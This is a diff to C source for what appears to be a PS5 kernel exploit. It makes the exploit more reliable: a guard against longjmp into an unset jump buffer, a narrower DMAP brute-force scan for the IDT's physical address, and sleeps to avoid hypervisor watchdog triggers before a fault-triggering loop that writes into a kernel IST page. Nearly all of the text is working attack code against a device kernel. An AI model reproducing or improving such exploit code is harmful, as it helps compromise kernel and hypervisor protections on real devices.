@@ -83,6 +83,7 @@ static volatile uint64_t     gp_trap_doreti_addr;
 static volatile uint64_t     gp_trap_mc_cs;
 static volatile uint64_t     gp_trap_mc_err;
 static sigjmp_buf            gp_trap_jmp_env;
+static volatile sig_atomic_t gp_trap_jmp_valid;  /* guard: only longjmp if set */
 static volatile sig_atomic_t gp_trap_attempt_count;
 static volatile int          gp_trap_sig_received;
 /* Runtime-discovered byte offsets into ucontext_t for mc_rip/mc_rsp.
@@ -2874,6 +2875,14 @@ gp_trap_fault_handler(int sig, siginfo_t *info, void *ctx)
 {
     (void)info;
 
+    /* Guard: only longjmp if jmp_buf has been set up by sigsetjmp.
+     * If we receive a signal before Phase 3, the jmp_buf is all-zeros
+     * and siglongjmp would jump to address 0 → kernel panic.
+     * In that case, just _exit to avoid crashing the kernel. */
+    if (!gp_trap_jmp_valid) {
+        _exit(42);
+    }
+
     /* Immediately deactivate writer to avoid corrupting any
      * subsequent exception's trap frame on the IST page. */
     gp_trap_writer_active = 0;
@@ -4489,7 +4498,7 @@ broad_done:
                  * hides it from the kernel's VA space, DMAP may still
                  * map those physical pages.  The IDT PA varies per boot
                  * due to KASLR (observed at ~448MB on one run). */
-                uint64_t phys_scan_end = 0x100000000ULL; /* 4GB */
+                uint64_t phys_scan_end = 0x40000000ULL; /* 1GB — IDT observed at PA 250-550MB */
                 int phys_pages_read = 0;
                 int phys_pages_fail = 0;
                 for (uint64_t pa = 0;
@@ -4867,6 +4876,11 @@ broad_done:
         gp_trap_ist_page_ptr = (volatile uint8_t *)ist_page;
         send_response(sock, "  Writer will target ist_page+0xFE0 (created in Phase 3)\n");
 
+        /* Brief sleep to let kernel settle after intensive scanning.
+         * The DMAP brute-force scan reads 100k+ pages; giving the
+         * system a breather helps avoid HV watchdog triggers. */
+        usleep(10000); /* 10ms */
+
         /* 7i. Probe ucontext_t layout + trigger iretq fault
          *
          * PS5's ucontext_t layout differs from the SDK headers.  The
@@ -4969,6 +4983,7 @@ broad_done:
          * SA_ONSTACK signal delivery) */
 
         send_response(sock, "\n  Probe complete. Proceeding to Phase 3...\n");
+        usleep(10000); /* 10ms breather before critical section */
 
         /* Phase 3: Trigger loop
          *
@@ -5096,6 +5111,7 @@ broad_done:
                 gp_trap_ist_cs = 0;
                 gp_trap_ist_err = 0;
 
+                gp_trap_jmp_valid = 1; /* enable siglongjmp in handler */
                 int jmp_rc = sigsetjmp(gp_trap_jmp_env, 1);
                 if (jmp_rc != 0) {
                     /* Returned from signal handler */
@@ -5361,6 +5377,9 @@ broad_done:
 
     step7_cleanup:
         send_response(sock, "\nStep 7 cleanup...\n");
+
+        /* Disable signal handler longjmp before any cleanup */
+        gp_trap_jmp_valid = 0;
 
         /* Clear IST page pointer so signal handler won't read stale data */
         gp_trap_ist_page_ptr = NULL;
